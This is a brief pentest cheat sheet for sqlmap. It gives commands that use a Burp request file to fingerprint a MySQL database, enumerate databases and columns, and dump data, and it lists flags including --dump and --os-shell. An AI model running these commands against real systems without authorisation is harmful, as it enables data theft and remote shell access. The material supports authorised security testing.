# SQLMAP

## GET Request

## POST Request

## Request file from Burp
```
Intercept a request from Burp with all of hte parameters (save as .req)
 $sqlmap -r <name of request file.req> --dbms=mysql --banner
 $sqlmap -r <name of request file.req> --dbms=mysql --dbs
 $sqlmap -r <name of request file.req> --dbms=mysql -D <name of db> --columns
 $sqlmap -r <name of request file.req> --dbms=mysql -D <name of db> -C --dump

-A = all
-D = database
-T = tables
-C = columns
--dump
--os-shell
```